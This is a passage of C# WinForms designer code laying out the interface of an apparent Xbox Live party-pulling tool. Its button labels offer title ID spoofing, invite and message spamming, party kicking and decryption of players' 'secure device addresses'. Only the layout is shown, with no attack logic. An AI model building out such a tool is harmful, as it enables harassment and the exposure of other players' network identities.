            this.metroTabPage6.Controls.Add(this.SpoofTitleIDCombo);
            this.metroTabPage6.Controls.Add(this.label13);
            this.metroTabPage6.Controls.Add(this.SpamMsgBtn);
            this.metroTabPage6.Controls.Add(this.panel16);
            this.metroTabPage6.Controls.Add(this.panel15);
            this.metroTabPage6.Controls.Add(this.panel14);
            this.metroTabPage6.Controls.Add(this.panel13);
            this.metroTabPage6.Controls.Add(this.panel12);
            this.metroTabPage6.Controls.Add(this.panel11);
            this.metroTabPage6.Controls.Add(this.panel10);
            this.metroTabPage6.Controls.Add(this.panel9);
            this.metroTabPage6.Controls.Add(this.MsgGamertagName);
            this.metroTabPage6.Controls.Add(this.MsgGamertagMsg);
            this.metroTabPage6.Controls.Add(this.SendMsgBtn);
            this.metroTabPage6.Controls.Add(this.button31);
            this.metroTabPage6.Controls.Add(this.AvatarChoice);
            this.metroTabPage6.Controls.Add(this.AvitarManifestTxt);
            this.metroTabPage6.Controls.Add(this.SetAvatarBtn);
            this.metroTabPage6.Controls.Add(this.button30);
            this.metroTabPage6.Controls.Add(this.button29);
            this.metroTabPage6.Controls.Add(this.AddXUIDsBtn);
            this.metroTabPage6.Controls.Add(this.AddFriendsBtn);
            this.metroTabPage6.Controls.Add(this.label9);
            this.metroTabPage6.Controls.Add(this.label8);
            this.metroTabPage6.Controls.Add(this.button24);
            this.metroTabPage6.Controls.Add(this.panel8);
            this.metroTabPage6.Controls.Add(this.panel7);
            this.metroTabPage6.Controls.Add(this.panel6);
            this.metroTabPage6.Controls.Add(this.panel5);
            this.metroTabPage6.Controls.Add(this.button10);
            this.metroTabPage6.Controls.Add(this.button23);
            this.metroTabPage6.Controls.Add(this.richTextBox2);
            this.metroTabPage6.Controls.Add(this.sdatxt);
            this.metroTabPage6.Controls.Add(this.label6);
            this.metroTabPage6.Enabled = true;
            this.metroTabPage6.HorizontalScrollbarBarColor = true;
            this.metroTabPage6.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage6.Name = "metroTabPage6";
            this.metroTabPage6.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage6.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage6.TabIndex = 5;
            this.metroTabPage6.Text = "    Extras";
            this.metroTabPage6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage6.VerticalScrollbarBarColor = true;
            this.metroTabPage6.Visible = false;
            // 
            // metroCheckBox2
            // 
            this.metroCheckBox2.AutoSize = true;
            this.metroCheckBox2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.metroCheckBox2.Location = new System.Drawing.Point(110, 319);
            this.metroCheckBox2.Name = "metroCheckBox2";
            this.metroCheckBox2.Size = new System.Drawing.Size(90, 15);
            this.metroCheckBox2.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroCheckBox2.TabIndex = 80;
            this.metroCheckBox2.Text = "Spam Invites";
            this.metroCheckBox2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroCheckBox2.UseStyleColors = true;
            this.metroCheckBox2.UseVisualStyleBackColor = true;
            this.metroCheckBox2.CheckedChanged += new System.EventHandler(this.metroCheckBox2_CheckedChanged);
            // 
            // SpoofedTitleIDBtn
            // 
            this.SpoofedTitleIDBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SpoofedTitleIDBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SpoofedTitleIDBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofedTitleIDBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SpoofedTitleIDBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SpoofedTitleIDBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofedTitleIDBtn.Location = new System.Drawing.Point(3, 313);
            this.SpoofedTitleIDBtn.Name = "SpoofedTitleIDBtn";
            this.SpoofedTitleIDBtn.Size = new System.Drawing.Size(101, 25);
            this.SpoofedTitleIDBtn.TabIndex = 78;
            this.SpoofedTitleIDBtn.Text = "Spoof Title ID";
            this.SpoofedTitleIDBtn.UseVisualStyleBackColor = false;
            this.SpoofedTitleIDBtn.Click += new System.EventHandler(this.SpoofedTitleIDBtn_Click);
            // 
            // SpoofTitleIDCombo
            // 
            this.SpoofTitleIDCombo.FormattingEnabled = true;
            this.SpoofTitleIDCombo.ItemHeight = 23;
            this.SpoofTitleIDCombo.Location = new System.Drawing.Point(3, 340);
            this.SpoofTitleIDCombo.Name = "SpoofTitleIDCombo";
            this.SpoofTitleIDCombo.Size = new System.Drawing.Size(543, 29);
            this.SpoofTitleIDCombo.TabIndex = 77;
            this.SpoofTitleIDCombo.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label13.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label13.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label13.Location = new System.Drawing.Point(95, 246);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(98, 17);
            this.label13.TabIndex = 76;
            this.label13.Text = "Title ID Spoofer";
            // 
            // SpamMsgBtn
            // 
            this.SpamMsgBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SpamMsgBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SpamMsgBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SpamMsgBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SpamMsgBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SpamMsgBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpamMsgBtn.Location = new System.Drawing.Point(693, 199);
            this.SpamMsgBtn.Name = "SpamMsgBtn";
            this.SpamMsgBtn.Size = new System.Drawing.Size(249, 25);
            this.SpamMsgBtn.TabIndex = 75;
            this.SpamMsgBtn.Text = "spam messages from XUIDs.text";
            this.SpamMsgBtn.UseVisualStyleBackColor = false;
            // 
            // panel16
            // 
            this.panel16.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel16.Location = new System.Drawing.Point(940, 259);
            this.panel16.Name = "panel16";
            this.panel16.Size = new System.Drawing.Size(2, 101);
            this.panel16.TabIndex = 74;
            // 
            // panel15
            // 
            this.panel15.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel15.Location = new System.Drawing.Point(685, 259);
            this.panel15.Name = "panel15";
            this.panel15.Size = new System.Drawing.Size(2, 101);
            this.panel15.TabIndex = 73;
            // 
            // panel14
            // 
            this.panel14.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel14.Location = new System.Drawing.Point(685, 360);
            this.panel14.Name = "panel14";
            this.panel14.Size = new System.Drawing.Size(257, 2);
            this.panel14.TabIndex = 72;
            // 
            // panel13
            // 
            this.panel13.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel13.Location = new System.Drawing.Point(685, 259);
            this.panel13.Name = "panel13";
            this.panel13.Size = new System.Drawing.Size(257, 2);
            this.panel13.TabIndex = 71;
            // 
            // panel12
            // 
            this.panel12.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel12.Location = new System.Drawing.Point(37, 241);
            this.panel12.Name = "panel12";
            this.panel12.Size = new System.Drawing.Size(224, 2);
            this.panel12.TabIndex = 70;
            // 
            // panel11
            // 
            this.panel11.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel11.Location = new System.Drawing.Point(37, 111);
            this.panel11.Name = "panel11";
            this.panel11.Size = new System.Drawing.Size(224, 2);
            this.panel11.TabIndex = 69;
            // 
            // panel10
            // 
            this.panel10.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel10.Location = new System.Drawing.Point(35, 111);
            this.panel10.Name = "panel10";
            this.panel10.Size = new System.Drawing.Size(2, 132);
            this.panel10.TabIndex = 68;
            // 
            // panel9
            // 
            this.panel9.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel9.Location = new System.Drawing.Point(261, 111);
            this.panel9.Name = "panel9";
            this.panel9.Size = new System.Drawing.Size(2, 132);
            this.panel9.TabIndex = 67;
            // 
            // MsgGamertagName
            // 
            this.MsgGamertagName.BackColor = System.Drawing.Color.Black;
            this.MsgGamertagName.CustomBackground = true;
            this.MsgGamertagName.CustomForeColor = true;
            this.MsgGamertagName.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.MsgGamertagName.Location = new System.Drawing.Point(685, 230);
            this.MsgGamertagName.MaxLength = 15;
            this.MsgGamertagName.Name = "MsgGamertagName";
            this.MsgGamertagName.PromptText = "Enter Gamertag";
            this.MsgGamertagName.Size = new System.Drawing.Size(135, 23);
            this.MsgGamertagName.Style = MetroFramework.MetroColorStyle.Black;
            this.MsgGamertagName.TabIndex = 66;
            this.MsgGamertagName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.MsgGamertagName.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.MsgGamertagName.UseStyleColors = true;
            // 
            // MsgGamertagMsg
            // 
            this.MsgGamertagMsg.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.MsgGamertagMsg.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.MsgGamertagMsg.Location = new System.Drawing.Point(685, 259);
            this.MsgGamertagMsg.Name = "MsgGamertagMsg";
            this.MsgGamertagMsg.Size = new System.Drawing.Size(257, 103);
            this.MsgGamertagMsg.TabIndex = 65;
            this.MsgGamertagMsg.Text = " ";
            // 
            // SendMsgBtn
            // 
            this.SendMsgBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SendMsgBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SendMsgBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SendMsgBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SendMsgBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SendMsgBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SendMsgBtn.Location = new System.Drawing.Point(826, 228);
            this.SendMsgBtn.Name = "SendMsgBtn";
            this.SendMsgBtn.Size = new System.Drawing.Size(116, 25);
            this.SendMsgBtn.TabIndex = 64;
            this.SendMsgBtn.Text = "Send Message";
            this.SendMsgBtn.UseVisualStyleBackColor = false;
            this.SendMsgBtn.Click += new System.EventHandler(this.SendMsgBtn_Click);
            // 
            // button31
            // 
            this.button31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button31.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button31.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button31.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button31.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button31.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button31.Location = new System.Drawing.Point(179, 53);
            this.button31.Name = "button31";
            this.button31.Size = new System.Drawing.Size(84, 25);
            this.button31.TabIndex = 63;
            this.button31.Text = "Set Custom Avatar";
            this.button31.UseVisualStyleBackColor = false;
            this.button31.Click += new System.EventHandler(this.button31_Click_1);
            // 
            // AvatarChoice
            // 
            this.AvatarChoice.FormattingEnabled = true;
            this.AvatarChoice.ItemHeight = 23;
            this.AvatarChoice.Items.AddRange(new object[] {
            "Professional",
            "LainOS",
            "XBLPET ALPHA",
            "Major Nelson",
            "Xbox VIP",
            "W"});
            this.AvatarChoice.Location = new System.Drawing.Point(35, 53);
            this.AvatarChoice.Name = "AvatarChoice";
            this.AvatarChoice.Size = new System.Drawing.Size(138, 29);
            this.AvatarChoice.TabIndex = 62;
            this.AvatarChoice.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // AvitarManifestTxt
            // 
            this.AvitarManifestTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.AvitarManifestTxt.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.AvitarManifestTxt.Location = new System.Drawing.Point(35, 111);
            this.AvitarManifestTxt.Name = "AvitarManifestTxt";
            this.AvitarManifestTxt.Size = new System.Drawing.Size(228, 132);
            this.AvitarManifestTxt.TabIndex = 61;
            this.AvitarManifestTxt.Text = "";
            // 
            // SetAvatarBtn
            // 
            this.SetAvatarBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SetAvatarBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SetAvatarBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SetAvatarBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SetAvatarBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SetAvatarBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SetAvatarBtn.Location = new System.Drawing.Point(35, 84);
            this.SetAvatarBtn.Name = "SetAvatarBtn";
            this.SetAvatarBtn.Size = new System.Drawing.Size(228, 25);
            this.SetAvatarBtn.TabIndex = 60;
            this.SetAvatarBtn.Text = "Set Custom Avatar";
            this.SetAvatarBtn.UseVisualStyleBackColor = false;
            this.SetAvatarBtn.Click += new System.EventHandler(this.SetAvatarBtn_Click);
            // 
            // button30
            // 
            this.button30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button30.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button30.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button30.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button30.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button30.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button30.Location = new System.Drawing.Point(727, 159);
            this.button30.Name = "button30";
            this.button30.Size = new System.Drawing.Size(228, 25);
            this.button30.TabIndex = 57;
            this.button30.Text = "Delete Friend From XUIDs.txt";
            this.button30.UseVisualStyleBackColor = false;
            this.button30.Click += new System.EventHandler(this.button30_Click);
            // 
            // button29
            // 
            this.button29.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button29.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button29.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button29.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button29.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button29.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button29.Location = new System.Drawing.Point(727, 128);
            this.button29.Name = "button29";
            this.button29.Size = new System.Drawing.Size(228, 25);
            this.button29.TabIndex = 56;
            this.button29.Text = "Delete Friend From GTs.txt";
            this.button29.UseVisualStyleBackColor = false;
            this.button29.Click += new System.EventHandler(this.button29_Click);
            // 
            // AddXUIDsBtn
            // 
            this.AddXUIDsBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.AddXUIDsBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AddXUIDsBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.AddXUIDsBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.AddXUIDsBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.AddXUIDsBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.AddXUIDsBtn.Location = new System.Drawing.Point(727, 98);
            this.AddXUIDsBtn.Name = "AddXUIDsBtn";
            this.AddXUIDsBtn.Size = new System.Drawing.Size(228, 25);
            this.AddXUIDsBtn.TabIndex = 54;
            this.AddXUIDsBtn.Text = "Add Friends From XUIDs.txt";
            this.AddXUIDsBtn.UseVisualStyleBackColor = false;
            this.AddXUIDsBtn.Click += new System.EventHandler(this.AddXUIDsBtn_Click);
            // 
            // AddFriendsBtn
            // 
            this.AddFriendsBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.AddFriendsBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AddFriendsBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.AddFriendsBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.AddFriendsBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.AddFriendsBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.AddFriendsBtn.Location = new System.Drawing.Point(727, 67);
            this.AddFriendsBtn.Name = "AddFriendsBtn";
            this.AddFriendsBtn.Size = new System.Drawing.Size(228, 25);
            this.AddFriendsBtn.TabIndex = 53;
            this.AddFriendsBtn.Text = "Add Friends From GTs.txt";
            this.AddFriendsBtn.UseVisualStyleBackColor = false;
            this.AddFriendsBtn.Click += new System.EventHandler(this.AddFriendsBtn_Click);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label9.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label9.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label9.Location = new System.Drawing.Point(95, 28);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(80, 17);
            this.label9.TabIndex = 51;
            this.label9.Text = "Avatar Editor";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label8.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label8.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label8.Location = new System.Drawing.Point(793, 45);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(83, 17);
            this.label8.TabIndex = 51;
            this.label8.Text = "Friend Adder:";
            // 
            // button24
            // 
            this.button24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button24.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button24.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button24.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button24.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button24.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button24.Location = new System.Drawing.Point(379, 290);
            this.button24.Name = "button24";
            this.button24.Size = new System.Drawing.Size(228, 25);
            this.button24.TabIndex = 49;
            this.button24.Text = "Stasis Source Code";
            this.button24.UseVisualStyleBackColor = false;
            this.button24.Click += new System.EventHandler(this.button24_Click_1);
            // 
            // panel8
            // 
            this.panel8.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel8.Location = new System.Drawing.Point(303, 30);
            this.panel8.Name = "panel8";
            this.panel8.Size = new System.Drawing.Size(384, 2);
            this.panel8.TabIndex = 48;
            // 
            // panel7
            // 
            this.panel7.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel7.Location = new System.Drawing.Point(303, 190);
            this.panel7.Name = "panel7";
            this.panel7.Size = new System.Drawing.Size(384, 2);
            this.panel7.TabIndex = 47;
            // 
            // panel6
            // 
            this.panel6.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel6.Location = new System.Drawing.Point(303, 30);
            this.panel6.Name = "panel6";
            this.panel6.Size = new System.Drawing.Size(2, 162);
            this.panel6.TabIndex = 46;
            // 
            // panel5
            // 
            this.panel5.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel5.Location = new System.Drawing.Point(685, 30);
            this.panel5.Name = "panel5";
            this.panel5.Size = new System.Drawing.Size(2, 162);
            this.panel5.TabIndex = 45;
            // 
            // button10
            // 
            this.button10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button10.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button10.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button10.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button10.Location = new System.Drawing.Point(379, 259);
            this.button10.Name = "button10";
            this.button10.Size = new System.Drawing.Size(228, 25);
            this.button10.TabIndex = 41;
            this.button10.Text = "Decrypt";
            this.button10.UseVisualStyleBackColor = false;
            this.button10.Click += new System.EventHandler(this.button10_Click_1);
            // 
            // button23
            // 
            this.button23.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button23.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button23.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button23.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button23.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button23.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button23.Location = new System.Drawing.Point(303, 198);
            this.button23.Name = "button23";
            this.button23.Size = new System.Drawing.Size(384, 26);
            this.button23.TabIndex = 44;
            this.button23.Text = "Check Gamertags";
            this.button23.UseVisualStyleBackColor = false;
            this.button23.Click += new System.EventHandler(this.button23_Click);
            // 
            // richTextBox2
            // 
            this.richTextBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.richTextBox2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.richTextBox2.Location = new System.Drawing.Point(303, 30);
            this.richTextBox2.Name = "richTextBox2";
            this.richTextBox2.Size = new System.Drawing.Size(384, 162);
            this.richTextBox2.TabIndex = 42;
            this.richTextBox2.Text = "";
            // 
            // sdatxt
            // 
            this.sdatxt.BackColor = System.Drawing.Color.Black;
            this.sdatxt.CustomBackground = true;
            this.sdatxt.CustomForeColor = true;
            this.sdatxt.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.sdatxt.Location = new System.Drawing.Point(379, 230);
            this.sdatxt.Name = "sdatxt";
            this.sdatxt.Size = new System.Drawing.Size(228, 23);
            this.sdatxt.Style = MetroFramework.MetroColorStyle.Black;
            this.sdatxt.TabIndex = 40;
            this.sdatxt.Text = "Enter a secure device address to decrypt it";
            this.sdatxt.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.sdatxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.sdatxt.UseStyleColors = true;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label6.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label6.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label6.Location = new System.Drawing.Point(435, 9);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(111, 17);
            this.label6.TabIndex = 43;
            this.label6.Text = "Gamertag Checker";
            // 
            // metroTabPage1
            // 
            this.metroTabPage1.BackColor = System.Drawing.Color.Teal;
            this.metroTabPage1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("metroTabPage1.BackgroundImage")));
            this.metroTabPage1.Controls.Add(this.metroTextBox1);
            this.metroTabPage1.Controls.Add(this.label1);
            this.metroTabPage1.Controls.Add(this.SpamPartyInvx);
            this.metroTabPage1.Controls.Add(this.InviteGamertagBtn);
            this.metroTabPage1.Controls.Add(this.SpoofTitleIDBtn);
            this.metroTabPage1.Controls.Add(this.PartyKickByGT);
            this.metroTabPage1.Controls.Add(this.PartyGTTxt);
            this.metroTabPage1.Controls.Add(this.GrabPartyByGT);
            this.metroTabPage1.Controls.Add(this.metroPanel18);
            this.metroTabPage1.Controls.Add(this.metroPanel17);
            this.metroTabPage1.Controls.Add(this.metroPanel16);
            this.metroTabPage1.Controls.Add(this.metroPanel15);
            this.metroTabPage1.Controls.Add(this.metroPanel14);
            this.metroTabPage1.Controls.Add(this.metroPanel13);
            this.metroTabPage1.Controls.Add(this.metroPanel12);
            this.metroTabPage1.Controls.Add(this.metroPanel11);
            this.metroTabPage1.Controls.Add(this.metroPanel10);
            this.metroTabPage1.Controls.Add(this.metroPanel9);
            this.metroTabPage1.Controls.Add(this.metroPanel8);
            this.metroTabPage1.Controls.Add(this.metroPanel7);
            this.metroTabPage1.Controls.Add(this.metroPanel6);
            this.metroTabPage1.Controls.Add(this.metroPanel5);
            this.metroTabPage1.Controls.Add(this.metroPanel4);
            this.metroTabPage1.Controls.Add(this.metroPanel3);
            this.metroTabPage1.Controls.Add(this.metroPanel2);
            this.metroTabPage1.Controls.Add(this.metroPanel1);
            this.metroTabPage1.Controls.Add(this.button22);
            this.metroTabPage1.Controls.Add(this.button13);
            this.metroTabPage1.Controls.Add(this.button12);
            this.metroTabPage1.Controls.Add(this.button11);
            this.metroTabPage1.Controls.Add(this.DataClients);
            this.metroTabPage1.Controls.Add(this.LabelPartyPrivacy);
            this.metroTabPage1.Controls.Add(this.button8);
            this.metroTabPage1.Controls.Add(this.LabelClientCount);
            this.metroTabPage1.Controls.Add(this.ButtonRefreshParty);
            this.metroTabPage1.Enabled = true;
            this.metroTabPage1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.metroTabPage1.ForeColor = System.Drawing.SystemColors.ControlText;
            this.metroTabPage1.HorizontalScrollbar = true;
            this.metroTabPage1.HorizontalScrollbarBarColor = true;
            this.metroTabPage1.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage1.Name = "metroTabPage1";
            this.metroTabPage1.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage1.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage1.TabIndex = 0;
            this.metroTabPage1.Text = "                                                  Pull";
            this.metroTabPage1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage1.VerticalScrollbar = true;
            this.metroTabPage1.VerticalScrollbarBarColor = true;
            this.metroTabPage1.VerticalScrollbarSize = 5;
            this.metroTabPage1.Visible = true;
            // 
            // metroTextBox1
            // 
            this.metroTextBox1.BackColor = System.Drawing.Color.Black;
            this.metroTextBox1.CustomBackground = true;
            this.metroTextBox1.CustomForeColor = true;
            this.metroTextBox1.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.metroTextBox1.Location = new System.Drawing.Point(801, 59);
            this.metroTextBox1.MaxLength = 15;
            this.metroTextBox1.Name = "metroTextBox1";
            this.metroTextBox1.Size = new System.Drawing.Size(137, 23);
            this.metroTextBox1.Style = MetroFramework.MetroColorStyle.Black;
            this.metroTextBox1.TabIndex = 56;
            this.metroTextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.metroTextBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox1.UseStyleColors = true;
            // 
            // label1
            // 
            this.label1.BackColor = System.Drawing.Color.LightSeaGreen;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(203, 3);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(567, 13);
            this.label1.TabIndex = 18;
            this.label1.Text = "   Current Party";
            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // SpamPartyInvx
            // 
            this.SpamPartyInvx.AutoSize = true;
            this.SpamPartyInvx.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpamPartyInvx.Location = new System.Drawing.Point(801, 233);
            this.SpamPartyInvx.Name = "SpamPartyInvx";
            this.SpamPartyInvx.Size = new System.Drawing.Size(90, 15);
